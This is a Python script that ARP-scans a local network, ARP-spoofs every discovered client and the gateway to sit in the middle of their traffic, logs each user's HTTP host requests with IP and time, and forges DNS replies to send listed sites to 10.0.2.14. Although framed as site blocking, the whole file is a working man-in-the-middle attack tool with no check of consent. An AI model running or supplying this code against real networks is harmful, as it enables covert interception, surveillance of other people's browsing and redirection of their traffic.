#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
from scapy.layers import http
import argparse
from threading import *
from time import *
import re

connected_clients = []
blocked_websites = []

file_name = re.sub("\s\d\d:\d\d:\d\d", "", asctime())
log_file = open(os.path.abspath(os.getcwd())+"/Logs/"+file_name+".txt", "a")

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target", dest="target", help="Use to specify target IP/IP Range.")
    parser.add_argument("-g", "--gateway", dest="gateway_ip", help="Use to specify the gateway IP.")
    options = parser.parse_args()
    if not options.target:
        parser.error("[-] Please specify a target IP/IP Range, use --help for more info.")
    if not options.gateway_ip:
        parser.error("[-] Please specify the gateway IP, use --help for more info.")
    return options

def scan(ip):
    global connected_clients
    while True:
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
        clients_list = []
        for element in answered_list:
            client_dict = {"ip":element[1].psrc , "mac":element[1].hwsrc}
            clients_list.append(client_dict)
        connected_clients = [] + clients_list
        print_scan_result(connected_clients)
        print("\rNumber of Connected Clients: ", len(connected_clients))
        sleep(120)

def print_scan_result(results_list):
    print("IP\t\t\tMAC Address\n-----------------------------------------")
    for client in results_list:
        print(client["ip"]+"\t\t"+client["mac"])

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def connect_clients(gateway_ip):
    global connected_clients
    gateway_mac = get_mac(gateway_ip)
    try:
        while True:
            for client in connected_clients:
                packet_1 = scapy.ARP(op=2, pdst=client["ip"], hwdst=client["mac"], psrc=gateway_ip)
                packet_2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=client["ip"])
                scapy.send(packet_1,verbose=False)
                scapy.send(packet_2,verbose=False)
            sleep(2)
    except:
        print("[!] Restoring ARP Tables......")
        for client in connected_clients:
            packet_1 = scapy.ARP(op=2, pdst=client["ip"], hwdst=client["mac"], psrc=gateway_ip, hwsrc=gateway_mac)
            packet_2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=client["ip"], hwsrc=client["mac"])
            scapy.send(packet_1, count=4, verbose=False)
            scapy.send(packet_2, count=4, verbose=False)

def read_blocked_websites():
    global blocked_websites
    blocked_website_list_file = open("website_list.txt", "r")
    for each_website in blocked_website_list_file:
        blocked_websites.append(each_website.strip("\n"))

def write_log(url):
    log_file.write(asctime()+"\t"+url+"\n\n")

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(http.HTTPRequest):
        if scapy_packet[scapy.TCP].dport == 80:
            url = "User at ip "+str(scapy_packet[scapy.IP].src) + " Accessed: "+str(scapy_packet[http.HTTPRequest].Host) #+ str(scapy_packet[http.HTTPRequest].Path)
            #print(url)
            write_log(url)
    if scapy_packet.haslayer(scapy.DNSRR):
        website_requested = scapy_packet[scapy.DNSQR].qname.decode()
        for name in blocked_websites:
            if name in website_requested:
                print("[+] Blocking Website:",website_requested)
                answer = scapy.DNSRR(rrname=website_requested, rdata="10.0.2.14")
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.UDP].chksum
                del scapy_packet[scapy.UDP].len

                packet.set_payload(bytes(scapy_packet))
    packet.accept()

def filter_traffic():
    print("[+] Reading blocked website list")
    try:
        read_blocked_websites()
    except:
        print("[-] Error Occurred, Unable to read file")
    else:
        print("[+] Website list successfully read")
        print(blocked_websites)
    while True:
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, process_packet)
        queue.run()

try:
    options = get_arguments()
    scan_network = Thread(target=scan, args=(options.target,), daemon=True)
    route_clients = Thread(target=connect_clients, args=(options.gateway_ip,), daemon=True)
    network_filter = Thread(target=filter_traffic, daemon=True)
    scan_network.start()
    route_clients.start()
    network_filter.start()
    scan_network.join()
    route_clients.join()
    network_filter.join()
except KeyboardInterrupt:
    gateway_mac = get_mac(options.gateway_ip)
    print("[!] Restoring ARP Tables......")
    for client in connected_clients:
        packet_1 = scapy.ARP(op=2, pdst=client["ip"], hwdst=client["mac"], psrc=options.gateway_ip, hwsrc=gateway_mac)
        packet_2 = scapy.ARP(op=2, pdst=options.gateway_ip, hwdst=gateway_mac, psrc=client["ip"], hwsrc=client["mac"])
        scapy.send(packet_1, count=4, verbose=False)
        scapy.send(packet_2, count=4, verbose=False)
    print("[+] ARP Tables Restored")
    print("[+] Writing Logs to the Memory...........")
    log_file.close()
    print("[+] Logs Successfully written.......Quitting....")
